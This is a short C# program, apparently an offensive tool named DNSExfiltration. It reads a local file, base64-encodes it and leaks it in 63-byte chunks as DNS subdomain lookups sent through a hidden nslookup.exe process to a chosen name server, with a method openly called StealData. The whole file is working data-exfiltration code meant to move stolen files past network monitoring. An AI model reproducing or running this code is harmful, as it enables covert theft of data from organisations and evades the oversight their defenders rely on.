using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Threading;

namespace DNSExfiltration
{
    class Program
    {

        // Your domain name
        static string Domain = "example.com";
        // Your DNS Server's IP
        static string NSserver = "192.168.110.154";
        static void Main(string[] args)
        {
            ConvertToBase64("web02-xor.txt", "encode");
            StealData("encode");
        }

        public static void ConvertToBase64(string file, string newFile)
        {
            byte[] bytes = File.ReadAllBytes(file);
            string base64 = Convert.ToBase64String(bytes);
            // Write base64 to a file
            File.WriteAllText(newFile, base64);
        }

        public static void SendingBytes(string subdomain)
        {
            // Create a  new process
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            // Create a object ProcessStartInfo for attribute StratInfo of new process
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            // Use nslookup to query DNS
            startInfo.FileName = "nslookup.exe";
            // Arguments use for nslookup
            startInfo.Arguments = subdomain + "." + Domain + " " + NSserver;
            process.StartInfo = startInfo;
            process.Start();
        }
        public static void StealData(string file)
        {
            // Buffer: 20 KB
            const int BUFFER_SIZE = 20 * 1024;
            byte[] buffer = new byte[BUFFER_SIZE];

            using (Stream input = File.OpenRead(file))
            {
                int bytesRead;
                // Stream.Position: The current position within the stream
                // Stream.Length: A long value representing the length of the stream in bytes
                while (input.Position < input.Length)
                {
                    bytesRead = input.Read(buffer, 0, 63);
                    // Call function request to DNS Server
                    SendingBytes(System.Text.Encoding.UTF8.GetString(buffer, 0, bytesRead));
                    Console.WriteLine(System.Text.Encoding.UTF8.GetString(buffer, 0, bytesRead));
                    Thread.Sleep(500);
                }
            }
            Console.WriteLine("Finished");
            Console.Read();
        }
    }
}
